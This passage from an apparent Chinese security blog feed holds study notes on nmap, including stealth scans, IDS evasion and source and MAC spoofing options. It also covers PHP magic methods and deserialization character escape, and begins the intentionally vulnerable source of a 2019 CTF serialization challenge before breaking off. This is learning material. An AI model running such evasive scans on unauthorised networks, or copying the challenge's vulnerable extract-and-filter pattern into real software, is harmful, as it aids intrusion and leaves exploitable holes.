开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议,FIN, Null等扫描会引起。</span><br><span class="line">closed|filtered：（关闭或者被过滤的）：无法确定端口是关闭的还是被过滤的</span><br></pre></td></tr></table></figure><p>除了端口表，Nmap还能提供关于目标机的进一步信息，包括<strong>反向域名，操作系统猜测，设备类型，和MAC地址。</strong></p><h1 id="选项概要"><a href="#选项概要" class="headerlink" title="选项概要"></a>选项概要</h1><p><a href="https://svn.nmap.org/nmap/docs/nmap.usage.txt">nmap最新选项</a></p><h2 id="target-specification-目标说明"><a href="#target-specification-目标说明" class="headerlink" title="target specification(目标说明)"></a>target specification(目标说明)</h2><p>can pass hostnames, Ip addresses,networks,etc</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  -iL &lt;inputfilename&gt;: Input from list of hosts/networks</span><br><span class="line"><span class="meta">#</span><span class="bash">nmap -iL target.txt  如果你有一个ip地址列表，将这个保存为一个txt文件，和namp在同一目录下,扫描这个txt内的所有主机</span></span><br><span class="line">  -iR &lt;num hosts&gt;: Choose random targets (随机选择目标)</span><br><span class="line">eg: nmap -iR 5#随机5个目标扫描</span><br><span class="line">  --exclude &lt;host1[,host2][,host3],...&gt;: Exclude hosts/networks</span><br><span class="line">  --excludefile &lt;exclude_file&gt;: Exclude list from file</span><br><span class="line"><span class="meta">#</span><span class="bash">nmap 192.168.1.1/24 -exclude 192.168.1.1 排除192.168.1.1扫描其他网络</span></span><br><span class="line"><span class="meta">#</span><span class="bash">nmap 192.168.1.1/24 -excludefile target.txt ?报错</span></span><br><span class="line"><span class="meta">#</span><span class="bash">I cannot figure out what <span class="built_in">source</span> address to use <span class="keyword">for</span> device xcluce, does it even exist?</span></span><br><span class="line"><span class="meta">#</span><span class="bash">QUITTING!</span></span><br></pre></td></tr></table></figure><h2 id="HOST-DISCOVERY-发现主机"><a href="#HOST-DISCOVERY-发现主机" class="headerlink" title="HOST DISCOVERY(发现主机):"></a>HOST DISCOVERY(发现主机):</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">-sL: 列表扫描 - 简单列出要扫描的目标</span><br><span class="line">-sP: Ping 扫描 - 只需确定主机是否在线</span><br><span class="line">-P0：将所有主机视为online -- 跳过主机发现</span><br><span class="line">-PS/PA/PU [portlist]: TCP SYN/ACK 或 UDP 发现探测到给定的端口</span><br><span class="line">-PE/PP/PM：ICMP 回显、时间戳和网络掩码请求发现探测</span><br><span class="line">-n/-R：从不进行 DNS 解析/始终解析 [默认：有时解析]</span><br></pre></td></tr></table></figure><p><strong>-sL (列表扫描)</strong></p><p>列表扫描是主机发现的退化形式，它仅仅列出指定网络上的每台主机， 不发送任何报文到目标主机。默认情况下，Nmap仍然对主机进行反向域名解析以获取 它们的名字</p><p>既然只是打印目标主机的列表，像其它一些高级功能如端口扫描，操作系统探测或者Ping扫描 的选项就没有了。如果您希望关闭ping扫描而仍然执行这样的高级功能，请阅读关于 <code>-P0</code>选项的介绍。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 部分</span></span><br><span class="line">Nmap scan report for 192.168.3.254</span><br><span class="line">Nmap scan report for 192.168.3.255</span><br><span class="line">Nmap done: 256 IP addresses (0 hosts up) scanned in 4.07 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>-sP(Ping扫描)</strong></p><p>该选项告诉Nmap仅仅进行ping扫描，然后打印出对扫描做出响应的那些主机。没有进一步的测试 (如端口扫描或者操作系统探测)。 这比列表扫描更积极，常常用于和列表扫描相同的目的。它可以得到些许目标网络的信息而不被特别注意到。 对于攻击者来说，了解多少主机正在运行比列表扫描提供的一列IP和主机名往往更有价值。</p><p>系统管理员往往也很喜欢这个选项。 它可以很方便地得出 网络上有多少机器正在运行或者监视服务器是否正常运行。常常有人称它为 地毯式ping，<strong>它比ping广播地址更可靠，因为许多主机对广播请求不响应。</strong></p><p><code>-sP</code>选项在默认情况下， 发送一个ICMP回声请求和一个TCP报文到80端口。如果非特权用户执行，就发送一个SYN报文 (用<code>connect()</code>系统调用)到目标机的80端口。 当特权用户扫描局域网上的目标机时，会发送ARP请求(<code>-PR</code>)， ，除非使用了<code>--send-ip</code>选项。 <code>-sP</code>选项可以和除<code>-P0</code>)之外的任何发现探测类型<code>-P*</code> 选项结合使用以达到更大的灵活性。 一旦使用了任何探测类型和端口选项，默认的探测(ACK和回应请求)就被覆盖了。 当防守严密的防火墙位于运行Nmap的源主机和目标网络之间时， 推荐使用那些高级选项。否则，当防火墙捕获并丢弃探测包或者响应包时，一些主机就不能被探测到。</p><p>PING扫描需要ROOT权限，如果用户没有ROOT权限,PING扫描将会使用connect()调用.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">部分</span></span><br><span class="line">Nmap scan report for 192.168.3.23</span><br><span class="line">Host is up (0.00043s latency).</span><br><span class="line">MAC Address: xxx (Intel Corporate)</span><br><span class="line">Nmap scan report for 192.168.3.24</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (5 hosts up) scanned in 1.95 seconds</span><br></pre></td></tr></table></figure><p><strong>-P0 (无ping)</strong></p><p>该选项完全跳过Nmap发现阶段。 通常Nmap在进行高强度的扫描时用它确定正在运行的机器。 默认情况下，Nmap只对正在运行的主机进行高强度的探测如 端口扫描，版本探测，或者操作系统探测。用<code>-P0</code>禁止 主机发现会使Nmap对<em>每一个</em>指定的目标IP地址 进行所要求的扫描。所以如果在命令行指定一个B类目标地址空间(/16)， 所有 65,536 个IP地址都会被扫描。 <code>-P0</code>的第二个字符是数字0而不是字母O。 和列表扫描一样，跳过正常的主机发现，但不是打印一个目标列表， 而是继续执行所要求的功能，就好像每个IP都是活动的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 部分</span></span><br><span class="line">Nmap scan report for 192.168.3.24</span><br><span class="line">Host is up (0.0000020s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong><code>-PS [portlist]</code> (TCP SYN Ping)</strong></p><p>该选项发送一个设置了SYN标志位的空TCP报文。 默认目的端口为80 (可以通过改变<code>nmap.h</code>) 文件中的DEFAULT-TCP-PROBE-PORT值进行配置，但不同的端口也可以作为选项指定。 甚至可以指定一个以逗号分隔的端口列表(如 <code>-PS22，23，25，80，113，1050，35000</code>)， 在这种情况下，每个端口会被并发地扫描。</p><p>SYN标志位告诉对方您正试图建立一个连接。 通常目标端口是关闭的，一个RST (复位) 包会发回来。 如果碰巧端口是开放的，目标会进行TCP三步握手的第二步，回应 一个SYN/ACK TCP报文。然后运行Nmap的机器则会扼杀这个正在建立的连接， 发送一个RST而非ACK报文，否则，一个完全的连接将会建立。 RST报文是运行Nmap的机器而不是Nmap本身响应的，因为它对收到 的SYN/ACK感到很意外。</p><p>Nmap并不关心端口开放还是关闭。 无论RST还是SYN/ACK响应都告诉Nmap该主机正在运行。</p><p>在UNIX机器上，通常只有特权用户 <code>root</code> 能否发送和接收 原始的TCP报文。因此作为一个变通的方法，对于非特权用户， Nmap会为每个目标主机进行系统调用connect()，它也会发送一个SYN 报文来尝试建立连接。如果connect()迅速返回成功或者一个ECONNREFUSED 失败，下面的TCP堆栈一定已经收到了一个SYN/ACK或者RST，该主机将被 标志位为在运行。 如果连接超时了，该主机就标志位为down掉了。这种方法也用于IPv6 连接，因为Nmap目前还不支持原始的IPv6报文。</p><h2 id="扫描技术"><a href="#扫描技术" class="headerlink" title="扫描技术"></a>扫描技术</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">扫描技术：</span><br><span class="line">  -sS/sT/sA/sW/sM： TCP SYN/Connect()/ACK/Window/Maimon 扫描</span><br><span class="line">  -sN/sF/sX：TCP Null、FIN 和 Xmas 扫描</span><br><span class="line">  --scanflags &lt;flags&gt;：自定义 TCP 扫描标志</span><br><span class="line">  -sI &lt;zombie host[:probeport]&gt;： Idlescan</span><br><span class="line">  -sO：IP 协议扫描</span><br><span class="line">  -b &lt;ftp 中继主机&gt;：FTP 反弹扫描</span><br></pre></td></tr></table></figure><p><strong>tcp SYN Scan (sS) SYN半连接扫描</strong></p><p>半开放扫描，因为这种技术使得Nmap不需要通过完整的握手，就能获得远程主机的信息。Nmap发送SYN包到远程主机，但是它不会产生任何会话.因此不会在目标主机上产生任何日志记录,因为没有形成会话。这个就是SYN扫描的优势.</p><p>如果nmap没有指出扫描类型默认是 Tcp SYN 但他需要root/administrator</p><p>#nmap -sS 192.168.1.1</p><p><strong>tcp connect() scan(sT) TCP全连接扫描</strong></p><p>Tcp connect()扫描需要完成三次握手,并且要求调用系统的connect().Tcp connect()扫描技术只适用于找出TCP和UDP端口.</p><p>#nmap -sT 192.168.1.1</p><p><strong>UDP scan (sU)</strong></p><p>寻找目标主机打开的UDP端口.它不需要发送任何的SYN包，针对UDP端口的。UDP扫描发送UDP数据包到目标主机，并等待响应,如果返回ICMP不可达的错误消息，说明端口是关闭的，如果得到正确的适当的回应，说明端口是开放的.</p><p>#nmap -sU 192.168.1.1</p><p><strong>FIN scan(sF)</strong></p><p>有时候Tcp SYN扫描不是最佳的扫描模式,因为有防火墙的存在.目标主机有时候可能有IDS和IPS系统的存在,防火墙会阻止掉SYN数据包。发送一个设置了FIN标志的数据包并不需要完成TCP的握手.</p><p>FIN扫描也不会在目标主机上创建日志(FIN扫描的优势之一).个类型的扫描都是具有差异性的,FIN扫描发送的包只包含FIN标识,NULL扫描不发送数据包上的任何字节,XMAS扫描发送FIN、PSH和URG标识的数据包.</p><p><strong>version scan(sV)</strong></p><p>不过它需要从开放的端口获取信息来判断软件的版本.使用版本检测扫描之前需要先用TCP SYN扫描开放了哪些端口.</p><p><strong>idle scan(sL)</strong></p><p>Idle scan是一种先进的扫描技术，它不用你真实的主机Ip发送数据包，而是使用另外一个目标网络的主机发送数据包.</p><p>Idle scan是一种理想的匿名扫描技术,通过目标网络中的192.168.1.6向主机192.168.1.1发送数据，来获取192.168.1.1开放的端口</p><p>有需要其它的扫描技术，如 FTP bounce（FTP反弹）, fragmentation scan（碎片扫描）, IP protocol scan（IP协议扫描）,以上介绍的是几种最主要的扫描方式.</p><p><strong>os检测(O)</strong></p><p>Nmap有一个名为的nmap-OS-DB数据库，  Nmap把TCP和UDP数据包发送到目标机器上，然后检查结果和数据库对照。</p><p>Nmap的操作系统指纹识别技术：</p><ul><li><p>设备类型（路由器，工作组等）</p></li><li><p>运行（运行的操作系统）</p></li><li><p>操作系统的详细信息（操作系统的名称和版本）</p></li><li><p>网络距离（目标和攻击者之间的距离跳）</p></li></ul><p>如果远程主机有防火墙，IDS和IPS系统，你可以使用-PN命令来确保不ping远程主机，因为有时候防火墙会组织掉ping请求.-PN命令告诉Nmap不用ping远程主机。</p><p>#nmap -O -PN 192.168.1.1/24</p><p><strong>PN参数可以绕过ping 命令 但不影响主机的系统发现</strong></p><p>OS Scan的结果是不可靠的，因为没有发现至少一个开放或者关闭的端口.应该是远程主机做了针对操作系统检测的防范。如果Nmap不能检测到远程操作系统类型，那么就没有必要使用**-osscan_limit**检测。</p><p><strong>#nmap -O –osscan-guess 192.168.1.1</strong></p><h2 id="端口规范和扫描："><a href="#端口规范和扫描：" class="headerlink" title="端口规范和扫描："></a>端口规范和扫描：</h2><p>-p &lt;端口范围&gt;：仅扫描指定端口</p><p>EX：-P22; -P1-65535; -P U：53,111,137，T：21-25,80,139,8080 </p><p>-f：快速 - 仅扫描NMAP-Services文件中列出的端口</p><p>-R：连续扫描端口 - 不要随机化</p><h2 id="服务-版本检测："><a href="#服务-版本检测：" class="headerlink" title="服务/版本检测："></a>服务/版本检测：</h2><p> -sV：探测开放端口以确定服务/版本信息<br> –version-light：限制最可能的探测以更快识别<br> –version-all：尝试每个用于版本检测的单个探测器<br> –version-trace：显示详细的版本扫描活动（用于调试）</p><h2 id="操作系统检测："><a href="#操作系统检测：" class="headerlink" title="操作系统检测："></a>操作系统检测：</h2><p> -O：启用操作系统检测<br> –osscan-limit：将操作系统检测限制为有希望的目标<br> –osscan-guess：猜测操作系统更多积极  </p><h2 id="计时和性能"><a href="#计时和性能" class="headerlink" title="计时和性能:"></a>计时和性能:</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-T[0-6]：设置计时模板（越高越快）</span><br><span class="line">--min-hostgroup/max-hostgroup &lt;size&gt;：并行主机扫描组大小</span><br><span class="line">--min-parallelism/max-parallelism &lt;numprobes&gt;：探针并行化</span><br><span class="line">--min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;msec&gt;：指定探针往返时间。</span><br><span class="line">--host-timeout &lt;msec&gt;：在这么长的时间后放弃目标</span><br><span class="line">--scan-delay/--max-scan-delay &lt;msec&gt;：调整探测器之间的延迟</span><br></pre></td></tr></table></figure><h2 id="防火墙-IDS-逃避和欺骗："><a href="#防火墙-IDS-逃避和欺骗：" class="headerlink" title="防火墙/IDS 逃避和欺骗："></a>防火墙/IDS 逃避和欺骗：</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-f; --mtu &lt;val&gt;: 分片数据包 (可选w/给定 MTU)</span><br><span class="line">-D &lt;decoy1,decoy2[,ME],...&gt;: 用诱饵隐藏扫描</span><br><span class="line">-S &lt;IP_Address&gt;: 欺骗源地址</span><br><span class="line">-e &lt;iface &gt;：使用指定的接口</span><br><span class="line">-g/--source-port &lt;</span><br><span class="line">portnum &gt;：使用给定的端口号--data-length &lt;num&gt;：将随机数据附加到发送的数据包中</span><br><span class="line">--ttl &lt;</span><br><span class="line">--spoof-mac &lt;mac 地址、前缀或供应商名称&gt;：欺骗您的 MAC 地址</span><br></pre></td></tr></table></figure><h2 id="OUTPUT："><a href="#OUTPUT：" class="headerlink" title="OUTPUT："></a>OUTPUT：</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-oN/-oX/-oS/-oG &lt;file&gt;：输出扫描结果为正常、XML、s|&lt;rIpt kIddi3 ,</span><br><span class="line">  和 Grepable 格式，分别为给定的文件名。</span><br><span class="line">-oA &lt;basename&gt;：一次以三种主要格式输出</span><br><span class="line">-v：增加详细级别（使用两次以获得更多效果）</span><br><span class="line">-d[level]：设置或增加调试级别（最多9个有意义）</span><br><span class="line">--packet-trace : 显示所有发送和接收的数据包</span><br><span class="line">--iflist: 打印主机接口和路由 (用于调试)</span><br><span class="line">--append-output: 附加到而不是破坏指定的输出文件</span><br><span class="line">--resume &lt;filename&gt;: 恢复中止的扫描</span><br><span class="line">--stylesheet &lt;path/URL&gt;：将 XML 输出转换为 HTML 的 XSL 样式表</span><br><span class="line">--no-stylesheet：防止 Nmap 将 XSL 样式表与 XML 输出关联</span><br></pre></td></tr></table></figure><h2 id="MISC："><a href="#MISC：" class="headerlink" title="MISC："></a>MISC：</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-6：启用 IPv6 扫描</span><br><span class="line">-A：启用操作系统检测和版本检测</span><br><span class="line">--datadir &lt;dirname&gt;：指定自定义 Nmap 数据文件位置</span><br><span class="line">--send-eth/--send-ip：使用原始以太网帧或 IP 数据包发送数据包</span><br><span class="line">--privileged：假设用户具有完全特权</span><br><span class="line">-V：打印版本number</span><br><span class="line">-h：打印此帮助摘要页。</span><br></pre></td></tr></table></figure><p>dnmap 多台客户端机器扫描服务端</p><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>–traceroute</td><td>扫描主机端口并跟踪路由</td></tr><tr><td>-p</td><td>扫描指定端口和端口范围</td></tr><tr><td>-sP</td><td>对目标主机进行ping扫描</td></tr><tr><td>-A</td><td>使用高级功能进行扫描</td></tr><tr><td>-PE</td><td>强制执行直接的ICMPping</td></tr><tr><td>-sV</td><td>探测服务版本信息</td></tr><tr><td>-d</td><td>增加调试信息地输出</td></tr><tr><td>-PU</td><td>发送udp ping</td></tr><tr><td>-ps</td><td>发送同步（SYN）报文</td></tr></tbody></table><p>2.重要参数</p><p>-sN：进行Null扫描</p><p>-sX：进行Xmas扫描</p><p>-O：进行测探目标主机版本（不是很准）</p><p>-sV：可以显示服务的详细版本</p><p>-A：全面扫描</p><p>-oN：会将扫描出来的结果保存成一个txt文件</p><p>-oX：会将扫描出来的结果保存成一个xml文件</p><p>[-T1]-[-T5]:提高扫描速度</p><p>3.详细分析</p><p>1）、主机发现</p><p>nmap -sP 192.168.16.0/24</p><p>2）、简单的扫描（默认会扫tcp 前1000端口）</p><p>nmap 192.168.16.100</p><p>3）、端口扫描</p><p>指定端口：nmap 192.168.16.100 -p 80(单个端口）</p><p>nmap 192.168.16.100 -p 1-100（多个端口）</p><p>nmap 192.168.16.100 -p- (所有端口)</p><p>TCP全连接扫描：nmap -sT 192.168.16.100 -p 80</p><p>优点：准确 缺点：速度慢，会留下大量、密集的日志记录</p><p>SYN半连接扫描：nmap -sS 192.168.16.100 -p 80</p><p>优点：速度很快 缺点：就是不准并且需要root权限</p><p>隐藏扫描：FIN扫描 Null扫描 Xmas扫描</p><p>4）、目标主机版本（不是很准确）</p><p>nmap -O 192.168.16.100 -p 80</p><p>5）、服务版本</p><p>nmap -O -sV 192.168.16.100 -p 80</p><p>6）、全面扫描</p><p>nmap -A 192.168.16.100 -p-</p><p>7）、保存结果</p><p>nmap -A 192.168.16.100 -p- -oN nmap1</p>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php魔法函数</title>
      <link href="/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/php%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0/"/>
      <url>/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/php%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h1><p>PHP中把以两个下划线__开头的方法称为魔术方法(Magic methods)，这些方法在PHP中充当了举足轻重的作用。 魔术方法包括：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. __construct() <span class="comment">#类的构造函数</span></span><br><span class="line"><span class="number">2</span>. __destruct() <span class="comment">#类的析构函数</span></span><br><span class="line"><span class="number">3</span>. __call()<span class="comment">#在对象中调用一个不可访问方法时调用</span></span><br><span class="line"><span class="number">4</span>. __callStatic()<span class="comment">#用静态方式中调用一个不可访问方法时调用</span></span><br><span class="line"><span class="number">5</span>. __get()<span class="comment">#获得一个类的成员变量时调用</span></span><br><span class="line"><span class="number">6</span>. __set()<span class="comment">#设置一个类的成员变量时调用</span></span><br><span class="line"><span class="number">7</span>. __isset()<span class="comment">#当对不可访问属性调用isset()或empty()时调用</span></span><br><span class="line"><span class="number">8</span>. __unset()<span class="comment">#当对不可访问属性调用unset()时被调用。</span></span><br><span class="line"><span class="number">9</span>. __sleep()<span class="comment">#执行serialize()时，先会调用这个函数</span></span><br><span class="line"><span class="number">10</span>. __wakeup()<span class="comment">#执行unserialize()时，先会调用这个函数</span></span><br><span class="line"><span class="number">11</span>. __toString()<span class="comment">#类被当成字符串时的回应方法</span></span><br><span class="line"><span class="number">12</span>. __invoke()<span class="comment">#当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。</span></span><br><span class="line"><span class="number">13</span>. __set_state()<span class="comment">#调用var_export()导出类时，此静态方法会被调用。</span></span><br><span class="line"><span class="number">14</span>. __clone()<span class="comment">#当对象复制完成时调用</span></span><br><span class="line"><span class="number">15</span>. __autoload()<span class="comment">#尝试加载未定义的类</span></span><br><span class="line"><span class="number">16</span>. __debugInfo()<span class="comment">#打印所需调试信息</span></span><br></pre></td></tr></table></figure><p>调用的顺序为： 构造方法 =&gt; set方法. =&gt; get方法 =&gt; isset方法 =&gt; unset方法 =&gt; isset方法 =&gt; 析构方法</p><p>__set()和__get()，刚刚是访问不存在或者不可访问属性时候进行的调用。__call()   __callStatic()  是访问不存在或者不可访问的方法时候</p><p>__sleep()   __wakeup()   __toString()</p><p>serialize会先调用sleep函数 unserialize会先调用wakeup函数</p><p>tostring当需要输出得到对象名称时候会调用</p><h2 id="序列化public-private-protect参数产生不同结果"><a href="#序列化public-private-protect参数产生不同结果" class="headerlink" title="序列化public private protect参数产生不同结果"></a>序列化public private protect参数产生不同结果</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="number">2</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="number">3</span>     <span class="keyword">private</span> <span class="variable">$test1</span>=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="number">4</span>     <span class="keyword">public</span> <span class="variable">$test2</span>=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="number">5</span>     <span class="keyword">protected</span> <span class="variable">$test3</span>=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="number">6</span> &#125;</span><br><span class="line"><span class="number">7</span> <span class="variable">$test</span> = <span class="keyword">new</span> test();</span><br><span class="line"><span class="number">8</span> <span class="keyword">echo</span> serialize(<span class="variable">$test</span>);  <span class="comment">//  O:4:&quot;test&quot;:3:&#123;s:11:&quot; test test1&quot;;s:5:&quot;hello&quot;;s:5:&quot;test2&quot;;s:5:&quot;hello&quot;;s:8:&quot; * test3&quot;;s:5:&quot;hello&quot;;&#125;</span></span><br><span class="line"><span class="number">9</span> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>test类定义了三个不同类型(私有，公有，保护)但是值相同的字符串，序列化输出的值不相同 O:4:”test”:3:{s:11:” test test1”;s:5:”hello”;s:5:”test2”;s:5:”hello”;s:8:” * test3”;s:5:”hello”;}</p><p>通过对网页抓取输出是这样的 O:4:”test”:3:{s:11:”\00test\00test1”;s:5:”hello”;s:5:”test2”;s:5:”hello”;s:8:”\00*\00test3”;s:5:”hello”;}</p><p>private的参数被反序列化后变成 \00test\00test1 public的参数变成 test2  protected的参数变成 \00*\00test3 </p><h1 id="php反序列化字符逃逸"><a href="#php反序列化字符逃逸" class="headerlink" title="php反序列化字符逃逸"></a>php反序列化字符逃逸</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># eg:</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;a:2:&#123;i:0;s:8:&quot;Hed9eh0g&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;abc&#x27;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$str</span>));</span><br><span class="line"><span class="comment">#仍然可以输出上面的结果，这说明反序列化的过程是有一定识别范围的，在这个范围之外的字符(第二个例子里的abc)都会被忽略，不影响反序列化的正常进行。</span></span><br></pre></td></tr></table></figure><h1 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span 